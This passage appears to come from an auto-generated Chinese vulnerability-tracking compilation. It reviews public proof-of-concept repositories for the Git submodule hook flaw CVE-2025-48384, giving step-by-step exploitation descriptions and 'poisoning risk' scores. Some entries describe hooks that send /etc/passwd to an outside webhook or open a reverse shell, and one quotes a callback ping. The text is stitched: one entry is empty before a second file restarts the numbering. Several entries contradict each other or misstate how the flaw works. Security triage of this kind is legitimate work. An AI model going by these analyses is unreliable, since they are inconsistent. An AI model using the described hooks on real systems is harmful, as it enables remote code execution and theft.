提供的POC代码是一个简单的 `post-checkout` 钩子脚本，用于打开一个网页 `https://github.com/kallydev`。利用方式是通过精心构造的子模块路径和符号链接，使得该脚本在 `git checkout` 操作后被执行。该POC代码有效，能够触发任意代码执行。

**投毒风险：**

该POC代码本身比较简单，只是打开一个网页，**不存在明显的恶意投毒代码**。因此，投毒风险较低，为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`文件的仓库，该文件中的子模块路径包含尾部回车符(
)。
2.  攻击者在仓库中创建一个符号链接，指向子模块目录下的 `.git/modules/<子模块名>/hooks` 目录，如 `evil_link -> .git/modules/<子模块名>/hooks/post-checkout`。
3.  攻击者在子模块中创建一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该仓库并初始化子模块 (`git submodule init` 和 `git submodule update`)。
5.  当受害者执行 `git checkout` 命令时，由于子模块路径包含尾部回车符，Git 会将子模块检出到错误的位置。由于符号链接的存在，`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**项目地址:** [kallydev/cve-2025-48384-hook](https://github.com/kallydev/cve-2025-48384-hook)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #23

**来源**: [CVE-2025-48384-liamg_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-liamg_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Config 注入 RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码注入/命令执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户进行`git clone --recursive`操作

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞是 Git 中的一个代码注入漏洞，源于 Git 在处理 config 文件时，没有正确处理carriage return (
)字符。攻击者可以通过在 submodule 的路径中注入 \r 字符，使得 submodule 被检出到错误的位置。如果精心构造一个 symlink 链接到 submodule 钩子目录，并使 submodule 包含一个可执行的 post-checkout 钩子，那么这个钩子脚本就会在检出后被执行，从而实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞已经公开，并且存在可利用的POC代码。从github搜索结果[webpage 6 begin]和[webpage 7 begin]可以知道，已经有开发者提供了复现代码。提供的POC代码包含两个文件：`README.md` 和 `post-checkout`。
  *   `README.md` 文件指向了GitHub的POC地址，说明这是一个漏洞验证示例。
  *   `post-checkout` 文件包含 `echo "Uh-oh, this is an RCE!"`，这是一个简单的命令执行示例，用于验证漏洞是否成功利用。
因此，提供的POC代码是有效的，可以用来验证此漏洞。

**投毒风险分析：**

提供的 POC 代码非常简单，只包含一个输出字符串的命令。**没有发现任何隐藏的、恶意的代码**，因此投毒风险较低。可以认为投毒风险为0%。虽然这是一个 RCE 漏洞的验证代码，在真实场景下，`post-checkout` 脚本会包含更复杂的恶意代码，但这不属于仓库投毒的范畴，POC 本身是为了验证漏洞的存在，而不是进行恶意攻击。

**利用方式：**

1.  **构造恶意的Git仓库：** 攻击者需要创建一个包含恶意配置的Git仓库，其中 submodule 的路径包含 \r 字符。
2.  **创建Symlink：** 在仓库中创建一个符号链接，将带有 \r 字符的路径链接到 `.git/modules/<submodule>/hooks` 目录。
3.  **添加恶意钩子：** 在 submodule 中创建一个可执行的 `post-checkout` 钩子脚本，这个脚本包含攻击者想要执行的任意代码。
4.  **诱导用户克隆仓库：** 攻击者需要诱导受害者执行 `git clone --recursive <malicious_repo>` 命令。
5.  **触发漏洞：** 当用户执行 `git clone --recursive` 命令时，Git 会读取恶意的配置，将 submodule 检出到错误的位置，并且由于 symlink 的存在，触发执行 `post-checkout` 钩子脚本，从而执行攻击者的代码。


**项目地址:** [liamg/CVE-2025-48384-submodule](https://github.com/liamg/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #24

**来源**: [CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md](../2025/CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未提供，参考描述推测较高

**影响版本:** 受影响版本范围未知，需进一步分析

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 70%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意配置的 Git 仓库，在受害者系统上写入任意文件，导致远程命令执行。该漏洞源于 Git 在处理 submodule 时，未对 `.gitmodules` 文件中的配置进行充分的安全检查。攻击者可以精心构造 `.gitmodules` 文件，诱导受害者克隆该仓库，从而在受害者本地文件系统中写入恶意文件，例如 shell 脚本，并进一步通过 Git hooks（如 `post-checkout`）触发执行。PoC 代码 `liamg/CVE-2025-48384` 提供了一个可复现该漏洞的示例。通过分析该 PoC，可以确认漏洞的有效性。利用步骤如下：

1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件包含指向攻击者控制的恶意 submodule 仓库的 URL。
3. 受害者克隆该恶意仓库。
4. Git 自动初始化并更新 submodule，从攻击者控制的 URL 下载恶意 submodule。
5. 恶意 submodule 在受害者系统上写入任意文件，例如在 `.git/hooks/post-checkout` 中写入恶意脚本。
6. 当受害者执行 `git checkout` 等操作时，`post-checkout` hook 会被触发，执行恶意脚本，导致远程命令执行。

`sogou.com`的搜索结果显示该漏洞影响非Windows系统。`Arctic Wolf` 的结果表明该漏洞的严重性很高。`Breaking Git with a carriage return and cloning RCE`表明漏洞与克隆子模块有关。

**投毒风险分析：**

该 PoC 包含通过 `curl` 下载并执行远程脚本的行为，具有较高的投毒风险。攻击者可能在远程脚本中嵌入恶意代码，例如窃取用户敏感信息、植入后门等。此外，由于该 PoC 修改了 Git 仓库的配置文件，攻击者可以通过篡改配置文件，诱导用户执行恶意操作。考虑到 `curl` 命令的普遍性和脚本执行的隐蔽性，该 PoC 的投毒风险较高，评为 70%。

防范措施包括：

* 及时更新 Git 版本，修复该漏洞。
* 谨慎克隆来自未知来源的 Git 仓库。
* 审查 `.gitmodules` 文件，确保 submodule URL 指向可信的仓库。
* 禁用 Git hooks，或者对 Git hooks 进行严格的安全审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供，需要查询NVD


---

## POC #25

**来源**: [CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md](../2025/CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md)

## CVE-2025-48384-Git配置引用导致的任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并使用 `--recurse-submodules` 参数初始化子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 在处理配置文件中的引号时不正确，特别是当子模块路径包含尾随回车符（CR）时。攻击者可以利用此漏洞通过创建包含恶意子模块配置的 Git 仓库，诱使用户克隆该仓库，并通过 `--recurse-submodules` 初始化子模块，从而导致任意代码执行。

**有效性分析：**

提供的 PoC 代码通过以下步骤利用该漏洞：

1.  创建一个包含恶意 hook 的 `evil` 目录，该 hook 会执行反向 shell。
2.  创建一个 `mainrepo` 目录，作为主仓库。
3.  在 `mainrepo` 目录中，创建一个 `.gitmodules` 文件，其中包含一个子模块定义，该子模块的路径包含尾随回车符 (`evil\r`)。
4.  创建一个符号链接，将 `evil
/hooks` 指向 `../evil/.git/hooks`，从而将恶意 hook 链接到子模块的 hooks 目录。
5.  将恶意子模块添加到仓库，并提交更改。
6.  通过 `git clone --recurse-submodules` 克隆 `mainrepo` 仓库，触发子模块初始化，从而执行恶意 hook。

根据 PoC 代码的逻辑和漏洞描述，该 PoC 代码是有效的。

**投毒风险分析：**

PoC 代码的目的是演示漏洞利用，其中包含的反向 shell 属于漏洞验证的一部分。但是，也存在潜在的投毒风险，比如在 `generate_poc.sh` 脚本中，作者可能会嵌入其他恶意代码，例如：

*   收集用户信息并发送到远程服务器。
*   修改系统文件。
*   安装恶意软件。

尽管PoC本身就是漏洞利用，但仍然存在被作者恶意利用的可能性，因此投毒风险评估为 10%。

**利用方式总结：**

1.  攻击者创建一个包含恶意子模块配置的 Git 仓库。
2.  攻击者诱使受害者克隆该仓库，并使用 `--recurse-submodules` 初始化子模块。
3.  Git 在处理包含尾随回车符的子模块路径时出现错误，导致子模块被检出到错误的位置。
4.  由于符号链接的存在，恶意 hook 被链接到子模块的 hooks 目录。
5.  在子模块初始化过程中，恶意 hook 被执行，导致任意代码执行。

**项目地址:** [nguyentranbaotran/cve-2025-48384-poc](https://github.com/nguyentranbaotran/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #26

**来源**: [CVE-2025-48384-replicatorbot_CVE-2025-48384.md](../2025/CVE-2025-48384-replicatorbot_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆包含恶意子模块的存储库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 20%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意子模块的 Git 仓库来执行任意文件写入。当用户克隆该仓库时，Git 会尝试初始化和更新子模块。恶意仓库通过`.gitmodules` 文件中的精心构造的配置，可以控制子模块的克隆方式，从而导致在用户系统上写入任意文件。根据搜索结果，该漏洞存在于 Git 的子模块处理逻辑中。PoC 代码通过创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库来演示该漏洞。当用户克隆该仓库时，`post-checkout` 脚本会被触发，该脚本会尝试在 `/tmp` 目录下创建一个文件 `asp-was-here-cve-2025-48384`，以此证明漏洞利用成功。利用步骤如下：1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含指向恶意仓库的子模块的 URL，以及执行任意文件写入所需的配置。2. 将恶意仓库上传到公共 Git 托管服务（例如 GitHub）。3. 诱使用户克隆恶意仓库。当用户执行 `git clone` 命令时，Git 会自动初始化和更新子模块。4. Git 执行 `.gitmodules` 文件中指定的命令，导致在用户系统上写入任意文件。

**POC有效性分析：** PoC 代码的有效性通过创建一个简单的 `post-checkout` 脚本来验证。该脚本尝试在 `/tmp` 目录下创建一个文件。如果文件创建成功，则表示漏洞利用成功。从搜索结果来看，多个来源证实了该漏洞的存在以及利用的可能性。GitHub 上存在公开的 PoC 代码，进一步证明了该漏洞的可利用性。一些安全厂商也发布了关于该漏洞的分析报告，表明该漏洞具有实际的威胁。该漏洞的修复需要更新 Git 到修复版本。

**投毒风险分析：** 该漏洞的投毒风险较低。虽然攻击者可以利用该漏洞在用户系统上写入任意文件，但写入的文件内容受到攻击者的控制。攻击者可以利用该漏洞来安装恶意软件或修改系统配置，但这种攻击需要用户执行额外的步骤。由于POC代码相对清晰，主要功能是创建文件，并未发现任何可疑的混淆或恶意行为，因此投毒风险较低。主要的风险在于，如果攻击者控制了目标机器，他们可以修改 `.git/config` 文件或设置环境变量，从而导致在克隆其他仓库时触发恶意行为。尽管存在潜在的风险，但攻击者需要具备较高的技术水平才能成功实施投毒攻击。PoC 代码主要使用标准的 shell 命令，例如 `touch`，没有发现任何可疑的系统调用或外部脚本。总体而言，该漏洞的投毒风险较低，但需要采取适当的措施来降低风险。建议用户验证克隆仓库的来源，避免克隆来自不受信任的来源的仓库，并及时更新 Git 到最新版本。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #27

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384 允许攻击者通过创建恶意的Git仓库，当用户克隆该仓库时，触发任意文件写入漏洞，导致远程代码执行。该漏洞源于 Git 在处理 submodule 时，没有充分验证配置，导致攻击者可以控制 `.gitmodules` 文件中的内容，从而在克隆过程中执行恶意操作。

POC代码分析：

`README.md` 只是一个简单的说明文件，用于标记这是一个 CVE-2025-48384 的 submodule。

`post-checkout` 脚本是漏洞利用的关键。它包含以下恶意行为：

1.  尝试将 `/etc/passwd` 文件发送到攻击者的 webhook 服务器 `https://cve48384.requestcatcher.com`。脚本尝试使用 `curl` 和 `wget` 命令，并忽略错误，以避免中断克隆过程。
2.  检查 `$HOME/flag.txt` 文件是否存在，如果存在，则将其内容复制到 `/tmp/flag.txt`。这可能用于在受害者系统上留下标记。
3.  尝试建立反向 shell 连接到攻击者的 IP 地址 `10.11.0.7` 的端口 `4444`。脚本尝试使用多种方法，包括 `bash`，`nc` 和 `sh`，以提高成功率。脚本使用 `nohup` 和 `disown` 命令将反向 shell 连接放到后台运行，并忽略错误。

利用步骤：

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件指向一个包含 `post-checkout` 脚本的 submodule。
2.  受害者克隆该恶意仓库。
3.  当 Git 初始化 submodule 时，会自动执行 `post-checkout` 脚本。
4.  `post-checkout` 脚本将执行恶意操作，例如发送 `/etc/passwd` 文件和建立反向 shell 连接。

POC 有效性分析：

POC 代码通过修改 `.gitmodules` 文件，在 submodule 初始化时执行恶意的 `post-checkout` 脚本。该脚本能够获取敏感信息（`/etc/passwd`）并尝试建立反向 shell 连接，证明了该漏洞的严重性。

投毒风险分析：

该 POC 具有较高的投毒风险，主要体现在以下几个方面：

1.  恶意脚本：`post-checkout` 脚本包含明显的恶意行为，例如发送敏感文件和建立反向 shell 连接。
2.  外部依赖：脚本依赖于 `curl`、`wget` 和 `nc` 等外部命令，这些命令可能被篡改或替换为恶意版本。
3.  反向 shell：建立反向 shell 连接可能导致受害者系统完全受攻击者控制。
4.  Webhook：将 `/etc/passwd` 文件发送到外部 webhook 服务器可能泄露敏感信息。

由于该POC利用submodule功能自动执行恶意脚本，且包含向外部服务器发送数据的行为，以及尝试建立反向shell连接，因此投毒风险较高。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #28

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响的Git CLI版本未知

**利用条件:** 需要用户克隆包含恶意配置的Git仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 20%

## 详情

CVE-2025-48384是Git中存在的一个严重漏洞，该漏洞源于Git对配置值中回车符（CR）处理不当，可能导致子模块检出期间出现路径遍历问题。攻击者可以利用此漏洞在特定条件下执行任意代码。该漏洞于2025年7月8日公开披露，并于2025年8月26日进行了最后修改。它已于2025年8月25日被添加到美国网络安全和基础设施安全局（CISA）已知被利用漏洞（KEV）目录中，表明该漏洞已在野外被积极利用，补救到期日为2025年9月15日。

该问题源于Git处理配置值的方式：在读取配置值时，Git会删除任何尾随的回车符和换行符（CRLF）。但是，在写入配置条目时，包含尾随CR的值未被正确引用，导致CR在后续读取期间丢失。这种差异会导致子模块被检出到错误的位置（如果其路径包含尾随CR）。如果攻击者设置一个将此更改后的路径指向子模块的hooks目录的符号链接，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会无意中执行该hook脚本，从而导致任意代码执行。

**POC有效性分析：**

根据提供的Dockerfile和README.md，该POC旨在演示CVE-2025-48384漏洞。Dockerfile用于构建一个包含易受攻击的Git版本的环境，README.md文件详细解释了漏洞的原理和利用方法。POC代码通过创建一个包含恶意配置的Git仓库，并诱导用户克隆该仓库来触发漏洞。通过精心构造的子模块路径和符号链接，攻击者可以在用户克隆仓库时执行任意代码。POC代码的有效性在于它能够重现漏洞的利用过程，并证明攻击者可以利用该漏洞在目标系统上执行恶意操作。

**利用步骤：**

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库，该文件中的子模块路径包含尾随CR字符。
2.  攻击者在仓库中创建一个符号链接，将修改后的子模块路径指向.git/hooks/post-checkout。
3.  攻击者将包含恶意配置和符号链接的仓库托管在公共服务器上或通过其他方式分发给目标用户。
4.  目标用户克隆该恶意仓库。
5.  当Git尝试检出子模块时，由于CR字符的处理不当，子模块将被检出到错误的位置，即符号链接指向的.git/hooks/post-checkout目录。
6.  如果子模块包含一个可执行的post-checkout hook，则该hook脚本将被执行，从而导致任意代码执行。

**投毒风险分析：**

该POC的投毒风险较低，因为提供的代码主要用于演示漏洞的利用，并没有明显的恶意行为。Dockerfile用于构建测试环境，README.md用于解释漏洞原理，POC代码本身也没有包含任何可疑的代码或外部依赖。然而，攻击者可能会修改POC代码，添加恶意功能，例如：

*   **代码混淆：** 攻击者可以使用代码混淆技术来隐藏恶意代码，使其更难被检测。
*   **恶意行为：** 攻击者可以在post-checkout hook中添加恶意代码，例如：安装后门、窃取敏感信息、破坏系统等。
*   **外部脚本：** 攻击者可以从外部服务器下载恶意脚本并在post-checkout hook中执行。

尽管存在这些潜在的风险，但原始POC代码的投毒风险较低，约为20%。在实际应用中，用户应谨慎克隆来自不受信任来源的Git仓库，并仔细检查.gitmodules文件和post-checkout hook，以防止受到攻击。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #29

**来源**: [CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md)

# CVE-2025-48384

> 📦 该CVE有 **35** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 需要克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 40%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆该仓库时，可能导致任意文件写入。该漏洞源于 Git 在处理 submodule 时存在缺陷。通过在 `.gitmodules` 文件中构造恶意的路径，攻击者可以控制 `git clone` 命令将文件写入到非预期的位置。 

POC有效性分析：
根据搜索结果和POC代码（liamg/CVE-2025-48384），该漏洞存在可利用性。POC代码包含一个 `.gitmodules` 文件和一个 `post-checkout` 脚本。`.gitmodules` 文件中定义了一个恶意 submodule，其路径被设置为一个绝对路径，指向系统中的敏感位置。`post-checkout` 脚本会在 `git clone` 之后自动执行，从而完成任意文件写入。执行 POC 需要先创建一个包含恶意 `.gitmodules` 文件的 Git 仓库，然后诱导用户克隆该仓库。当用户克隆仓库时，Git 会解析 `.gitmodules` 文件，并尝试初始化 submodule。由于 submodule 的路径被设置为恶意路径，Git 会将文件写入到该路径所指向的位置。

利用步骤：
1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. 将恶意仓库托管到公共代码托管平台或通过其他方式传播给目标用户。
3. 诱导目标用户克隆该仓库。
4. 当用户克隆仓库时，`post-checkout` 脚本被执行，完成任意文件写入。

投毒风险分析：
该POC的投毒风险为中等。虽然 POC 本身的功能是演示任意文件写入漏洞，但攻击者可能利用该漏洞进行恶意活动，例如：
*   植入后门：攻击者可以将恶意代码写入到系统启动脚本或常用工具中，从而在用户系统上植入后门。
*   篡改配置文件：攻击者可以修改系统配置文件，例如 SSH 配置文件，从而控制用户系统。
*   窃取敏感信息：攻击者可以将用户敏感信息，例如 SSH 密钥，写入到公共目录，从而窃取用户敏感信息。

该POC的 `post-checkout` 脚本包含 `echo` 和 `id` 命令，这本身不是恶意代码。但是，攻击者可以修改该脚本，使其包含更具破坏性的恶意代码。此外，该POC使用绝对路径来指定 submodule 的位置，这可能会引起用户的怀疑。攻击者可以通过使用相对路径或环境变量来隐藏恶意路径，从而提高攻击的隐蔽性。由于该漏洞影响 Git，一个被广泛使用的版本控制系统，因此利用该漏洞进行大规模攻击是可能的。但是，由于利用该漏洞需要用户克隆恶意仓库，因此攻击的成功率取决于用户的警惕性。
总的来说，该漏洞的投毒风险为中等，约为40%。攻击者可以利用该漏洞进行恶意活动，但攻击的成功率取决于用户的警惕性和攻击者的技术水平。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #2

**来源**: [CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆恶意Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384是一个存在于Git中的高危漏洞，允许攻击者创建恶意的Git仓库，当用户克隆这些仓库时，可能导致任意文件写入。根据搜索结果，该漏洞与`git clone`子模块有关，通过精心构造的`.gitmodules`文件以及其他Git配置，可能实现在克隆过程中写入任意文件，进而执行恶意代码。

**POC有效性分析：**

根据已找到的POC代码（/tmp/vulnwatchdog_569f31ff6b5166501e6218f8839f5620/post-checkout），攻击者可以在`post-checkout`钩子中插入恶意命令。当用户克隆包含此恶意钩子的仓库时，`post-checkout`脚本会被执行。示例代码中的`ping wtt0rkb926c0mj6tsxmzfr2xlorff53u.test-burp.huidoumeng.com`表明PoC的目的是通过DNS请求来验证漏洞是否被成功触发。这可以用于简单地检测漏洞的存在，但实际攻击中可以替换为任意恶意命令，例如下载并执行payload，或修改系统配置。

利用该漏洞，攻击者可以诱导用户克隆恶意仓库，从而在用户系统上执行任意代码。考虑到Git的广泛使用，尤其是在开发环境中，该漏洞的影响范围非常大。成功利用该漏洞可能导致敏感信息泄露、系统被完全控制等严重后果。

**利用步骤：**

1.  攻击者创建一个包含恶意`.gitmodules`和`post-checkout`钩子的Git仓库。
2.  攻击者诱导受害者克隆此仓库（例如，通过社交工程、钓鱼邮件等）。
3.  当受害者执行`git clone`命令时，恶意`post-checkout`钩子被触发，执行攻击者预设的恶意命令。

**投毒风险分析：**

此PoC的投毒风险较高，初步判断为60%。原因如下：

1.  **恶意代码执行：** PoC通过`post-checkout`钩子执行命令，允许攻击者在受害者机器上执行任意代码。如果攻击者将恶意代码嵌入到广泛使用的开源项目中，并诱导开发者clone，影响范围会进一步扩大。
2.  **命令注入：** 尽管PoC中的示例代码只是一个简单的`ping`命令，但攻击者可以将其替换为更复杂的恶意命令，例如下载并执行恶意脚本，这大大增加了投毒的潜在危害。
3.  **传播方式：** 该漏洞可以通过Git仓库进行传播，这意味着攻击者可以将恶意代码隐藏在看似正常的代码库中，并利用开发者之间的协作关系进行传播。考虑到软件供应链攻击的日益严重，这种投毒方式的危害性不可忽视。

为了降低投毒风险，组织应加强对Git仓库的审计，确保代码的安全性，并对克隆的仓库进行安全检查。同时，应教育开发者提高安全意识，避免克隆来源不明的仓库。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #3

**来源**: [CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md](../2025/CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md)

## CVE-2025-48384 - Git 任意文件写入导致远程代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入导致远程代码执行

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定，参考GitHub advisory

**利用条件:** 需要用户执行git clone --recursive操作，攻击者可控制的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是Git中的一个关键漏洞，允许攻击者在执行`git clone --recursive`操作期间写入任意文件。此漏洞可能通过恶意的.gitmodules文件、符号链接和Git hooks导致远程代码执行（RCE）。此漏洞影响Linux和macOS平台，Windows不受影响。

POC有效性分析：提供的POC包含一个Python扫描器，用于检测利用CVE-2025-48384的潜在恶意Git仓库。扫描器检查`.gitmodules`文件中的可疑条目（包含`..`或以`\r`结尾的路径）、指向hooks的符号链接以及可执行的hooks脚本。POC的`cve_2025_48384_auto_print_scanner.py`脚本通过以下步骤检测漏洞：1. 读取`.gitmodules`文件并查找`path`条目，检查是否存在`..`（目录遍历）或以`\r`（回车符）结尾的情况，这可能导致文件写入到预期位置之外。2. 在仓库中查找指向`.git/hooks`目录的符号链接，这些链接可能被用来劫持Git hook执行流程。3. 查找仓库中可执行的Git hooks（如`post-checkout`，`post-merge`，`pre-commit`，`pre-push`，`post-commit`等）。这些hooks如果被恶意修改，可以在特定的Git操作期间执行任意代码。

利用步骤：攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件包含指向仓库外部或包含回车符的子模块路径。攻击者还可以创建指向`.git/hooks`目录的符号链接，或者直接包含恶意的可执行Git hooks。当受害者使用`git clone --recursive`克隆此仓库时，恶意`.gitmodules`文件可能导致Git写入任意文件，符号链接可能劫持Git hook执行，可执行的hooks会被执行，从而导致RCE。

投毒风险分析：该POC包含一个扫描器，其本身不包含直接的恶意代码，但它可以被修改以包含恶意行为。该POC的投毒风险主要来自于以下几个方面：1. 扫描器可以被修改为在检测到漏洞后，自动执行某些操作，例如下载并执行恶意payload。2. 扫描器可以被修改为将扫描结果发送到远程服务器，从而泄露敏感信息。3. 扫描器可能依赖于外部库，这些库可能包含漏洞或恶意代码。4. 扫描器生成的报告可能被篡改，以误导用户或隐藏潜在的漏洞。 由于该POC的代码相对清晰，主要使用标准库，并且没有明显的恶意行为，因此投毒风险为中等，约为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #4

**来源**: [CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md](../2025/CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本未知，请参考GitHub advisory获取更多信息。

**利用条件:** 需要克隆恶意Git仓库，并递归初始化子模块

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过创建恶意的Git仓库来执行任意文件写入。该漏洞主要存在于Git客户端处理子模块的方式中。当用户克隆一个包含恶意配置的仓库，并且使用`--recurse-submodules`选项初始化子模块时，攻击者可以利用`.gitmodules`文件中的特殊构造，在目标系统上写入任意文件。

**POC有效性分析：**
根据提供的POC代码，攻击者可以通过构造包含恶意`.gitmodules`文件的Git仓库来利用此漏洞。该文件指定了子模块的URL和路径，当用户使用`git clone --recurse-submodules`命令克隆仓库时，Git客户端会尝试初始化这些子模块。攻击者可以在子模块的路径中嵌入特殊字符，例如换行符，来欺骗Git客户端，使其将子模块的内容写入到非预期的位置。提供的POC代码使用一个名为`sub`的子模块，并将恶意代码放置在`.git/modules/sub/hooks/post-checkout`中，从而实现远程代码执行。通过修改子模块路径，攻击者可以在目标系统上写入任意文件，从而控制系统。

**利用步骤：**
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将该仓库托管在公共或私有Git服务器上。
3. 攻击者诱使用户克隆该仓库，并使用`--recurse-submodules`选项初始化子模块，例如：`git -c protocol.file.allow=always clone --recurse-submodules git@github.com:liamg/CVE-2025-48384.git`。
4. 当Git客户端尝试初始化子模块时，恶意代码会被写入到目标系统的`.git/modules/sub/hooks/post-checkout`文件中。
5. 当用户执行与子模块相关的Git操作时（例如切换分支），`post-checkout`钩子会被触发，从而执行攻击者写入的恶意代码。

**投毒风险分析：**
